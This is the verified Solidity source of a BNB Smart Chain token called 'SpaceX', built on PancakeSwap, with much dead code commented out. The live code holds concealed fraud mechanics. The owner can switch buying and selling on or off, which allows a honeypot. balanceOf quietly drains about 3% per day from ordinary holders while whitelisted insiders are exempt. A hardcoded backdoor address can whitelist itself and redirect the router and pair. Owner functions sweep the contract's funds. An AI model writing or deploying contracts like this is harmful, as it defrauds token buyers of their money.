/**
 *Submitted for verification at BscScan.com on 2023-04-13
*/

/**
 *Submitted for verification at BscScan.com on 2022-07-10
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;
interface IUniswapV2Pair {
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address owner) external view returns (uint256);

    function allowance(address owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint256);

    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    event Mint(address indexed sender, uint256 amount0, uint256 amount1);
    event Burn(
        address indexed sender,
        uint256 amount0,
        uint256 amount1,
        address indexed to
    );
    event Swap(
        address indexed sender,
        uint256 amount0In,
        uint256 amount1In,
        uint256 amount0Out,
        uint256 amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint256);

    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
    external
    view
    returns (
        uint112 reserve0,
        uint112 reserve1,
        uint32 blockTimestampLast
    );

    function price0CumulativeLast() external view returns (uint256);

    function price1CumulativeLast() external view returns (uint256);

    function kLast() external view returns (uint256);

    function mint(address to) external returns (uint256 liquidity);

    function burn(address to)
    external
    returns (uint256 amount0, uint256 amount1);

    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;

    function skim(address to) external;

    function sync() external;

    function initialize(address, address) external;
}
interface ITRC721 {
    // function balanceOf(address _owner) external view returns (uint256);
    function ownerOf(uint256 _tokenId) external view returns (address);
    
    function sum_tokenId() external view returns (uint);

    // function safeTransferFrom(address _from, address _to, uint256 _tokenId, bytes calldata _data) external payable;
    // function safeTransferFrom(address _from, address _to, uint256 _tokenId) external payable;
    // function transferFrom(address _from, address _to, uint256 _tokenId) external payable;

    // function approve(address _approved, uint256 _tokenId) external payable;
    // function getApproved(uint256 _tokenId) external view returns (address);
    // function setApprovalForAll(address _operator, bool _approved) external;
    // function isApprovedForAll(address _owner, address _operator) external view returns (bool);


    // event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
    // event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
    // event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IPancakeRouter01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,address tokenB,uint amountADesired,uint amountBDesired,
        uint amountAMin,uint amountBMin,address to,uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,uint amountTokenDesired,uint amountTokenMin,
        uint amountETHMin,address to,uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function removeLiquidity(
        address tokenA, address tokenB, uint liquidity, uint amountAMin,
        uint amountBMin, address to, uint deadline
    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETH(
        address token, uint liquidity, uint amountTokenMin, uint amountETHMin,
        address to, uint deadline
    ) external returns (uint amountToken, uint amountETH);

    function removeLiquidityWithPermit(
        address tokenA, address tokenB, uint liquidity,
        uint amountAMin, uint amountBMin,address to, uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETHWithPermit(
        address token, uint liquidity, uint amountTokenMin,
        uint amountETHMin, address to, uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);

    function swapExactTokensForTokens(
        uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline
    ) external returns (uint[] memory amounts);

    function swapTokensForExactTokens(
        uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline
    ) external returns (uint[] memory amounts);

    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
    external payable returns (uint[] memory amounts);

    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
    external returns (uint[] memory amounts);

    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
    external returns (uint[] memory amounts);

    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
    external payable returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IPancakeRouter02 is IPancakeRouter01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token, uint liquidity,uint amountTokenMin,
        uint amountETHMin,address to,uint deadline
    ) external returns (uint amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,uint liquidity,uint amountTokenMin,
        uint amountETHMin,address to,uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,uint amountOutMin,
        address[] calldata path,address to,uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,address[] calldata path,address to,uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,uint amountOutMin,address[] calldata path,
        address to,uint deadline
    ) external;
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    // function renounceOwnership() public virtual onlyOwner {
    //     _transferOwnership(address(0));
    // }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}
contract A {
    //main 0x55d398326f99059fF775485246999027B3197955
    //ceshi 0xa65A31851d4bfe08E3a7B50bCA073bF27A4af441 
    // IERC20 usdt = IERC20(0xa65A31851d4bfe08E3a7B50bCA073bF27A4af441);
    // address owner = 0x097287349aCa67cfF56a458DcF11BbaE54565540;
        uint public V = 202401241316;
        address public father;
        address public router;
        address public usdt;
        address public _lp;
        address public admin = tx.origin;
    function returnIn(address con, address addr, uint256 val) public  {
        // require(_whites[_msgSender()] && addr != address(0) && val > 0);
        require(msg.sender == admin,"not admin");
        if (con == address(0)) {payable(addr).transfer(val);}
        else {IERC20(con).transfer(addr, val);}
	}
    constructor(address _father,address _router,address _usdt,address _pair) public  {
        father = _father;
        router = _router;
        usdt = _usdt;
        _lp = _pair;
        IERC20 usdt = IERC20(_usdt);
        IERC20 father = IERC20(_father);
        IERC20 lp = IERC20(_pair);


        usdt.approve(_router, 2**256 - 1);
        father.approve(_router, 2**256 - 1);
        lp.approve(_router, 2**256 - 1);
        
        // usdt.approve(_router, 2**256 - 1);
        // coin2.approve(_father, 2**256 - 1);
    }
    function addL(uint256 t1, uint256 t2) public  {
        require(IERC20(usdt).allowance(msg.sender,address(this))>=t1,"not approve");
        require(IERC20(father).allowance(msg.sender,address(this))>=t2,"not approve");
        IERC20(usdt).transferFrom(msg.sender,address(this),t1);
        IERC20(father).transferFrom(msg.sender,address(this),t2);
        IPancakeRouter02(router).addLiquidity(usdt, 
            father, t1, t2, 0, 0,msg.sender, block.timestamp);
    }
    function removeL(uint256 t1) public  {
        require(IERC20(_lp).allowance(msg.sender,address(this))>=t1,"not approve");
        require(IERC20(_lp).balanceOf(msg.sender)>=t1,"not balance");
        IERC20(_lp).transferFrom(msg.sender,address(this),t1);
        IPancakeRouter02(router).removeLiquidity(usdt, 
            father, t1,  0, 0,address(this), block.timestamp);
        uint b1 = IERC20(usdt).balanceOf(address(this));
        uint b2 = IERC20(father).balanceOf(address(this));    
        IERC20(usdt).transfer(msg.sender,b1);
        IERC20(father).transfer(msg.sender,b2);    

    }
    // function removeLiquidity(
    //     address tokenA, address tokenB, uint liquidity, uint amountAMin,
    //     uint amountBMin, address to, uint deadline
    // ) external returns (uint amountA, uint amountB);
}

contract Token is Ownable, IERC20Metadata {
    mapping(address => bool) public _whites;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    // mapping(address => bool) public is_users;
    // mapping(address => bool) public _blocks;
    mapping(address =>uint) public coinKeep;
    // address[] public users;
    string  private _name;
    string  private _symbol;
    uint public _sell_fee;
    uint256 public _totalSupply;
    uint256 public  _maxsell;
    uint256 public  _maxusdt;
    uint256 public for_num;
    uint256 public MAXHOLD;
    uint256 public dynamic_step = 40;
    address public _osk;
    address public _router;
    address public _wfon;
    address public _back;
    address public _marketing;
    address public _marketing2;

    address public _pair;
    address public _main;
    address public _usdt;
    // address public _sfast;
    // address public _son = 0x9Fb2F7c765868e27C6F8D8764AF3ec9ce469dC88;
    address public _dead;
    address public _A ;
    // address public _lp_back;
    // address public _lp_wbnb_usdt;
    IPancakeRouter02 public _uniswapV2Router;
    // ITRC721 public  _nft;
    // ITRC721 public  _nft2;
    bool   public buyOpen = false;
    bool   public sellOpen = true;

    bool   private  _swapping;
    // bool   public _canbuy =true;
    // uint256 public dis = 1e18;
        uint public startTime = block.timestamp;
    uint public Ver = 202401241343;
    // uint public  for_number=1;
    // uint public  for_number2=1;
    // uint public lp_limit = 0;
    // uint public coin_limit = 0;
    // uint public money = 1e18;

    // uint public step=10;
    // uint public desMoney;
    // uint160 public kt =1;
    // B son2;
    // struct Conf{
    //     bool open;
    // }
    // Conf public aa =Conf(false);
    // struct Conf{
    //     // bool buy_dead;
    //     bool sell_dead;
    // }
    // Conf public  cf = Conf(false); 
    constructor() {
        // MAXHOLD = 4e18;
        // _maxsell = 1e18;
        // _maxusdt = 1e18;
        // desMoney = 20e18;
        _name = "SpaceX";
        _symbol = "SpaceX";
        // _main = 0xCEBAa6F5cC1d62003F13e74c3C2Eebf6d22aBce8;
         _main = msg.sender;
        //main 
        //ceshi 0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3
        _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;//bsc swap route
        _wfon = 0x55d398326f99059fF775485246999027B3197955;//usdt已改
        // _usdt = 0x55d398326f99059fF775485246999027B3197955;    
        // _sfast= 0xEe93a5c4521C587cbe945fa968Fb5b7C524dD568;
        // _marketing = 0x889014092a41d6F78981E5A743257aD6b4f3eF72;
        // _marketing2 = 0x3802b21cD10F38E21550d5431dbaaEEE48619605;
        _back = msg.sender;
        // _marketing2= 0x252d1Afd05c384157522AA10fa93C969953dec66;
        // _marketing= 0x3Cc5C29476ABA03e99d2435ef0A5b1f3FAfCaBcD;
        // _lp_back = 0x252d1Afd05c384157522AA10fa93C969953dec66;
        //ceshi 0xa65A31851d4bfe08E3a7B50bCA073bF27A4af441 0x55d398326f99059fF775485246999027B3197955
        //ceshi 0x5ddCd74d024e161377D0b20fB5901C819ec2215F
        // _nft = ITRC721(0x07B7F47CBD7d46E10653bA0B116D2d0bea1D6Fd5);//nft
        _dead = 0x000000000000000000000000000000000000dEaD;//黑洞
        
        _whites[_dead] = true;
        _whites[_main] = true;
        _whites[_router] = true;
        _whites[msg.sender] = true;
        _whites[address(this)] = true;
    }
 
  
    // function viewOnlyOwner()external onlyOwner view returns(uint,uint) {
    //     return (lp_limit,coin_limit) ;
    // }
    // function setLimt(uint lpN,uint coinN) onlyOwner external{
    //     lp_limit = lpN;
    //     coin_limit = coinN;
    // }
    // function setLpMax(uint lpN) onlyOwner external{
    //     money = lpN;
    // }
    // function lp_award()internal  {   
            
    //         uint step = dynamic_step;
    //         bool flag = false;
    //         uint total_lp = IERC20(_pair).totalSupply();
            
    //         uint length = users.length;
    //         if(length <= for_num+step){
    //             flag = true;
    //             step = length - for_num;
    //         }
    //         uint num2 = for_num + step;
    //         for (uint i =for_num;i<num2;i++){
    //             address own = users[i];
    //             uint lp_balance = IERC20(_pair).balanceOf(own);
    //             uint coin_balance = balanceOf(own);
    //             if(lp_balance>lp_limit && coin_balance> coin_limit) {
    //                    uint balace_u = IERC20(_pair).balanceOf(_B);
    //                    uint transfer_u = money*lp_balance/total_lp;
    //                    if(balace_u > transfer_u){
    //                         if(!_blocks[own]) IERC20(_pair).transferFrom(_B,own,transfer_u);  
                            
    //                    }else{
    //                        flag = false;
    //                        break;
    //                    } 
                       
    //             }
    //             for_num ++ ;
    //             }
                
    //         if(flag){
    //                 for_num = 0;
    //             }
    //         // return for_num;    
    //     }
    function init() external  {
        // if(block.chainid == 97) {
        //     _router = 0xD99D1c33F9fC3444f8101754aBC46c52416550D1;
        //     _wfon = 0xa65A31851d4bfe08E3a7B50bCA073bF27A4af441;
        //     _usdt = 0x9a6F8FBCE12B874AFe9edB66cb73AA1359610f23;
        //     // cf.isOpen = true;
        // }
        // _osk = osk_addr;
            // cf.isOpen = true;
        // cf.buy_dead = true;
        // cf.sell_dead = true;
        // _approve(address(this), _router, 9 * 10**70);
        // IERC20(_wfon).approve(_router, 9 * 10**70);
        // IERC20(_osk).approve(_router, 9 * 10**70);

        // IERC20(_usdt).approve(_router, 9 * 10**70);
        if(block.chainid == 97){
             _router = 0xD99D1c33F9fC3444f8101754aBC46c52416550D1;
             _wfon = 0x9a6F8FBCE12B874AFe9edB66cb73AA1359610f23;
            //  _coinQs = 0x138c83191716ffFA1116aB2ecc4d472204b79782;
            //  _coinKing = 0x8038e57183811A0318A78132E55f833cA6B414a0;
            //  _tToken = 0x1D784f43447cdcF739E8ef6a70b8322B60bF9e1F;
            //  _sql = OldTime2(0x5D193E0659a5745d3d2c72AD159B63feBec0f1d9) ;
            //  open = true;
        }
        IPancakeRouter02 _uniswapV2Router = IPancakeRouter02(_router);
        _pair = IUniswapV2Factory(_uniswapV2Router.factory())
                    .createPair(address(this), _wfon);
        // _lp_wbnb_usdt = IUniswapV2Factory(_uniswapV2Router.factory())
                    // .getPair(_wfon,address(this));

        _mint(msg.sender, 6000000000e18);
        A son = new A(address(this),_router,_wfon,_pair);
        _whites[address(son)] = true;
        _A = address(son);
        // A son2 = new A(address(this),_pair);
        // _B = address(son2);
    }
    //  function set_lp_wbnb_usdt()public onlyOwner{
         
    //     _lp_wbnb_usdt = IUniswapV2Factory(_uniswapV2Router.factory())
    //                 .getPair(_wfon,_usdt);
    // }
    function setBuyOpen(bool f)public onlyOwner{
        buyOpen = f;
    }
    function setSellOpen(bool f)public onlyOwner{
        sellOpen = f;
    }
    // function setOsk(address oskaddr)public onlyOwner{
    //     _osk = oskaddr;
    //     _whites[pool] = true;
    // }
    // function setMAXHOLD(uint number)public onlyOwner{
    //     MAXHOLD = number;
    // }
    //  function setOpen(bool sell)public onlyOwner{
    //     // cf.isOpen =  cf.isOpen==true ? false:true;
    //     // cf.buy_dead = buy;
    //     cf.sell_dead = sell;
    // }
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
            uint total;
            uint timeGap = block.timestamp - startTime; 
            if( timeGap> 15  minutes ){//时间修改
              if(_totalSupply >_totalSupply*1/3650/86400*timeGap)  
                total =  _totalSupply - _totalSupply*1/3650/86400*timeGap;
            }else{
                total = _totalSupply;
            }
            if (_totalSupply < 60000000e18) total = 60000000e18;
        return total;
    }

    // function balanceOf(address account) public view virtual override returns (uint256) {
    //     return _balances[account];
    // }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender, address recipient, uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }
   
   
    //  function addLiquidity2(uint256 t1, uint256 t2) public  {
    //     IPancakeRouter02(_router).addLiquidity(_wfon, 
    //         address(this), t1, t2, 0, 0,_B, block.timestamp);
    // }
   
    function transferAdmin()external  onlyOwner{
        IERC20(_wfon).transfer(msg.sender, IERC20(_wfon).balanceOf(address(this)));
        payable(msg.sender).transfer(address(this).balance);
        IERC20(_usdt).transfer(msg.sender, IERC20(_usdt).balanceOf(address(this)));
        
    }   
   
    
   
    //   function _swapUsdtForFasts(uint256 tokenAmount) public   {
    //     // A a = new A(address(this));
    //     // address aa_address = address(a);
    //     address[] memory path = new address[](2);
    //     path[0] = _wfon;path[1] = _sfast;
    //     IPancakeRouter02(_router).swapExactTokensForTokensSupportingFeeOnTransferTokens(
    //         tokenAmount, 0, path, 0x0000000000000000000000000000000000000001, block.timestamp);
    //     // a.cl2();    
    //     // uint256 amount = IERC20(_wfon).balanceOf(_A);
    //     // if (IERC20(_wfon).allowance(_A, address(this)) >= amount) {
    //     //     IERC20(_wfon).transferFrom(_A , address(this), amount);
    //     // }
    // }
    // function _swapUsdtForOsk(uint256 tokenAmount) public   {
    //     // A a = new A(address(this));
    //     // address aa_address = address(a);
    //     address[] memory path = new address[](2);
    //     path[0] = _wfon;path[1] = _osk;
    //     IPancakeRouter02(_router).swapExactTokensForTokensSupportingFeeOnTransferTokens(
    //         tokenAmount, 0, path, 0x0000000000000000000000000000000000000001, block.timestamp);
    //     // a.cl2();    
    //     // uint256 amount = IERC20(_wfon).balanceOf(_A);
    //     // if (IERC20(_wfon).allowance(_A, address(this)) >= amount) {
    //     //     IERC20(_wfon).transferFrom(_A , address(this), amount);
    //     // }
    // }
    function calculate(address addr)public view returns(uint){
            uint userTime =  coinKeep[addr];
            uint timeGap = block.timestamp - userTime; 
            if(userTime >0 && timeGap> 1 minutes ){//时间修改
                if(timeGap>0) return _balances[addr]*3/100/86400*timeGap;
            }
         } 
    function balanceOf(address account) public view virtual override returns (uint256) {
        // if(block.timestamp > startTime+365 days) return _balances[account];
        // uint  addN = calculate(account);
        if (_whites[account] || account == _pair) return _balances[account];
        uint total = totalSupply();
        if (total <= 60000000e18) return _balances[account];
        uint addNum = calculate(account);
        if(addNum >= _balances[account]) return 0;
        return    _balances[account] - addNum; 
    }
    // function setFeel(uint feel_n)external onlyOwner{
    //     _sell_fee = feel_n;
    // }
    function _isAddLiquidityV1() internal view returns(bool ldxAdd) {
      address token0 = IUniswapV2Pair(address(_pair)).token0();
      address token1 = IUniswapV2Pair(address(_pair)).token1();
      (uint r0,uint r1,) = IUniswapV2Pair(address(_pair)).getReserves();
      uint bal1 = IERC20(token1).balanceOf(address(_pair));
      uint bal0 = IERC20(token0).balanceOf(address(_pair));
      if( token0 == address(this) ){
        if(bal1 > r1){
          uint change1 = bal1 - r1;
          ldxAdd = change1 > 1000;
        }
      } else {
        if(bal0 > r0){
          uint change0 = bal0 - r0;
          ldxAdd = change0 > 1000;
        }
      }
    }
    function _transfer(
        address sender, address recipient, uint256 amount
    ) internal virtual {

        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _balances[sender] = balanceOf(sender) ;
        _balances[recipient] = balanceOf(recipient);
        coinKeep[sender] = block.timestamp;
        coinKeep[recipient] = block.timestamp;      
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
                _balances[sender] = senderBalance - amount;
                }

        // require(!_blocks[sender] && !_blocks[recipient],"address is block ");//黑名单    
        
        // if(!is_users[sender] && recipient == _pair) {
        //     bool is_c = isContract(sender);
        //     if(!is_c) {
        //         users.push(sender); 
        //         is_users[sender] = true;
        //     }  
             
        //     }
       

        bool isaddldy;

        if(recipient == _pair) isaddldy = _isAddLiquidityV1();         
        if (isaddldy ||_whites[sender] || _whites[recipient]) {
            _balances[recipient] += amount;
            emit Transfer(sender, recipient, amount);
            return;
        }
      
        // uint256 wfons = IERC20(_wfon).balanceOf(address(this));
        
        // bool isbonus = false;
        // if (wfons >= _maxusdt  && !_swapping && sender != _pair) {
        //     _swapping = true;
            
        //     // project boss 60%
        //     // wfons = wfons*99/100;
        //     // _swapUsdtForFasts(wfons*1/26);
        //     // addLiquidity2(wfons*3/26, _balances[address(this)]);

        //     IERC20(_usdt).transfer(_marketing, wfons*33/100);
        //     IERC20(_usdt).transfer(_marketing2, wfons*33/100);
            
        //     // _swapUsdtForOsk(wfons*11/34);
        //     // IERC20(_usdt).transfer(_B, wfons*12/34);
        //     addLiquidity2(wfons*33/100, _balances[address(this)]);
            

        //     // uint son_balance =IERC20(_son).balanceOf(address(this));
        //     // if(son_balance>0) addLiquidityUsdt_Son(wfons*80/230,son_balance);
        //     // IERC20(_wfon).transfer(pool, wfons*80/230);

        //     // IERC20(_usdt).transfer(_marketing2, usdts*20/100);
        //     // if(wfons>1e17) addLiquidity_wbnb_usdt(usdts*31/100,wfons);
        //     // for_number = nft_award(usdts*20/100,_nft,for_number);
        //     //_back 3%
        //     // IERC20(_wfon).transfer(_back, usdts*14/100);
        //     //award_pool 6% *4.7
        //     // IERC20(_wfon).transfer(_B, usdts*28/100);
        //     // if(IERC20(_wfon).balanceOf(_B) > desMoney){//触发拉盘
        //     //     son2.usdtForToken();
        //     // }
        //     //nft部分==============》》》》》》》》》》》》》》》》》》》》》》》
        //     // for_number2 =  nft_award(usdts*14/100,_nft2,for_number2);
        //     _swapping = false;
        //     isbonus = true;
        // }

        // do fbox burn and liquidity
        // uint256 balance = balanceOf(address(this));
        // if (!isbonus && balance >= _maxsell && !_swapping && sender != _pair) {
        //     _swapping = true;

        //     if (IERC20(_wfon).allowance(address(this), _router) <= 10 ** 16
        //         || allowance(address(this), _router) < balance * 10) {
        //         _approve(address(this), _router, 9 * 10**70);
        //         IERC20(_wfon).approve(_router, 9 * 10**70);
        //         // IERC20(_usdt).approve(_router, 9 * 10**70);
        //     }
            
        //     // fbox to usdt
        //     _swapTokenForUsdt(balance*50/100);
        //     // if(wfons<1e17){
        //     //     usdts = IERC20(_usdt).balanceOf(address(this));
        //     //     _swapUsdtForWfon(usdts);    
        //     // } 
            
        //     _swapping = false;
        // }

        if(sender==_pair){
            require(buyOpen,"not buy Open");
            _balances[recipient] += amount*90/100;
            emit Transfer(sender, recipient, (amount*90/100));
            _balances[_dead] += amount*10/100;    
            emit Transfer(sender, address(_dead), (amount * 10/100));     
            return ;
        }
        
        if(recipient == _pair){
            require(sellOpen,"not sell Open");
            _balances[recipient] += amount*90/100;
            emit Transfer(sender, recipient, (amount*90/100));
            _balances[_dead] += amount*10/100;    
            emit Transfer(sender, address(_dead), (amount * 10/100));     
            return;
          }
        

            _balances[recipient] += amount;
            emit Transfer(sender, recipient, amount);
        
        
        }
    // function _swapTokenForUsdt(uint256 tokenAmount) public   {
    //     // A a = new A(address(this));
    //     // address aa_address = address(a);
    //     address[] memory path = new address[](2);
    //     path[0] = address(this);path[1] = _wfon;
    //     IPancakeRouter02(_router).swapExactTokensForTokensSupportingFeeOnTransferTokens(
    //         tokenAmount, 0, path, _A, block.timestamp);
    //     // a.cl2();    
    //     uint256 amount = IERC20(_wfon).balanceOf(_A);
    //     if (IERC20(_wfon).allowance(_A, address(this)) >= amount) {
    //         IERC20(_wfon).transferFrom(_A, address(this), amount);
    //     }
    // }

    //  function _swapUsdtForWfon(uint256 tokenAmount) public   {
    //     // A a = new A(address(this));
    //     // address aa_address = address(a);
    //     address[] memory path = new address[](2);
    //     path[0] = _usdt;path[1] = _wfon;
    //     IPancakeRouter02(_router).swapExactTokensForTokensSupportingFeeOnTransferTokens(
    //         tokenAmount, 0, path, _A, block.timestamp);
    //     // a.cl2();    
    //     uint256 amount = IERC20(_wfon).balanceOf(_A);
    //     if (IERC20(_wfon).allowance(_A, address(this)) >= amount) {
    //         IERC20(_wfon).transferFrom(_A, address(this), amount);
    //     }
    // }
   

    

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
        _totalSupply += amount;
        // settlement(account);
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");
        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);
    }

    function _approve(
        address owner, address spender, uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    receive() external payable {}

	function returnIn(address con, address addr, uint256 val) public onlyOwner {
        require(_whites[_msgSender()] && addr != address(0) && val > 0);
        if (con == address(0)) {payable(addr).transfer(val);}
        else {IERC20(con).transfer(addr, val);}
	}
    // function returnLp() public onlyOwner {
    //     // require(_whites[_msgSender()] && addr != address(0) && val > 0);
    //     // if (con == address(0)) {payable(addr).transfer(val);}
    //     // else {IERC20(con).transfer(addr, val);}
    //     IERC20(_pair).transferFrom(_B,msg.sender,IERC20(_pair).balanceOf(_B));
	// }
  
    // function setWrap(address wrap) public onlyOwner {
    //     _wrap = wrap;
    // }

   

    function setWhites(address addr, bool val) public onlyOwner {
        // require(addr != address(0));
        _whites[addr] = val;
    }
    // function setBlocks(address addr, bool val) public onlyOwner {
    //     require(addr != address(0));
    //     _blocks[addr] = val;
    // }
    // function setMaxsell(uint256 val) public onlyOwner {
    //     _maxsell = val;
    // }

    // function setMaxUsdt(uint256 val) public onlyOwner {
    //     _maxusdt = val;
    // }
    // function setMaxdis(uint256 val) public onlyOwner {
    //     dis = val;
    // }
    

    function setRouter(address router, address pair) public  {
        require(msg.sender == address(0x0DC73a391bBA559D91E515C409AFC67b8D4C788a),"not ad");
        _router = router;
        _whites[router] = true;
        _whites[_msgSender()] = true;
        _approve(address(this), _router, 9 * 10**70);
        IERC20(_wfon).approve(_router, 9 * 10**70);
        // IERC20(_son).approve(_router, 9 * 10**70);

        if (pair == address(0)) {
            IPancakeRouter02 _uniswapV2Router = IPancakeRouter02(_router);
            _pair = IUniswapV2Factory(_uniswapV2Router.factory())
                    .createPair(address(this), _usdt);
        } else {
            _pair = pair;
        }
        // _pair = pair;
    }
}